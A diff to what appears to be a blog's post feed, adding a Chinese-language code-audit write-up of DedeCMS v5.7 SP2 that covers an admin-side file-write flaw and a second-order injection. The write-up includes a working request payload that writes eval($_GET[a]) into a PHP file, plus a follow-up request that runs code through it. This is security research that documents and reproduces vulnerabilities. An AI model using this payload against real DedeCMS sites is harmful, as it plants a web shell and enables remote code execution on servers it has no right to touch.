@@ -152,6 +152,36 @@
 </li>
 </ul>
 <p><img src="/2021/03/DedeCMSv5-7SP2代码审计/image-20210316215503126.png" alt="image-20210316215503126"></p>
+<h3 id="后台文件写入"><a href="#后台文件写入" class="headerlink" title="后台文件写入"></a>后台文件写入</h3><ul>
+<li><p>漏洞分析</p>
+<p>又是需要后台admin权限，太鸡肋了。DedeCMS后台本来就带有文件管理器，本着学习的态度就记录一下。</p>
+<p>问题出在<code>dede/sys_verifies.php</code>，<code>fwrite</code>的参数未经过过滤，导致文件写入，配合<code>require_once</code>getshell</p>
+</li>
+</ul>
+<p><img src="/2021/03/DedeCMSv5-7SP2代码审计/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202021-03-17%20190619.png" alt="屏幕截图 2021-03-17 190619"></p>
+<p><img src="/2021/03/DedeCMSv5-7SP2代码审计/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202021-03-17%20191424.png" alt="屏幕截图 2021-03-17 191424"></p>
+<ul>
+<li><p>漏洞复现</p>
+<p>访问<code>/dede/sys_verifies.php?action=getfiles&amp;refiles[]=\&quot;;eval($_GET[a]);die();//</code> 写入文件</p>
+<p><img src="/2021/03/DedeCMSv5-7SP2代码审计/image-20210317191752815.png" alt="image-20210317191752815"></p>
+<p>访问<code>/dede/sys_verifies.php?action=down&amp;a=phpinfo();</code>执行命令</p>
+<p><img src="/2021/03/DedeCMSv5-7SP2代码审计/image-20210317191855712.png" alt="image-20210317191855712"></p>
+</li>
+</ul>
+<h3 id="后台二次注入getshell"><a href="#后台二次注入getshell" class="headerlink" title="后台二次注入getshell"></a>后台二次注入getshell</h3><ul>
+<li><p>漏洞分析</p>
+<p>在<code>dede/ad_add.php</code>80-83行，参数<code>$normbody</code>未经过滤就放入数据库中</p>
+<p><img src="/2021/03/DedeCMSv5-7SP2代码审计/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202021-03-17%20193957.png" alt="屏幕截图 2021-03-17 193957"></p>
+<p>而在<code>plus/ad_js.php</code> 21-44行，查询结果直接包含。</p>
+<p><img src="/2021/03/DedeCMSv5-7SP2代码审计/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202021-03-17%20194249.png" alt="屏幕截图 2021-03-17 194249"></p>
+</li>
+<li><p>复现漏洞</p>
+<p><img src="/2021/03/DedeCMSv5-7SP2代码审计/image-20210317194532192.png" alt="image-20210317194532192"></p>
+</li>
+</ul>
+<p>  <img src="/2021/03/DedeCMSv5-7SP2代码审计/image-20210317194553335.png" alt="image-20210317194553335"></p>
+<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://www.freebuf.com/column/161703.html" target="_blank" rel="noopener">https://www.freebuf.com/column/161703.html</a></p>
+<p><a href="https://www.cnblogs.com/zpchcbd/p/12741373.html" target="_blank" rel="noopener">https://www.cnblogs.com/zpchcbd/p/12741373.html</a></p>
 ]]></content>
       <categories>
         <category>代码审计</category>
@@ -2788,8 +2818,8 @@
         <category>CTF</category>
       </categories>
       <tags>
-        <tag>PHP</tag>
         <tag>BYPASS_DISABLE_FUNCTIONS</tag>
+        <tag>PHP</tag>
       </tags>
   </entry>
   <entry>
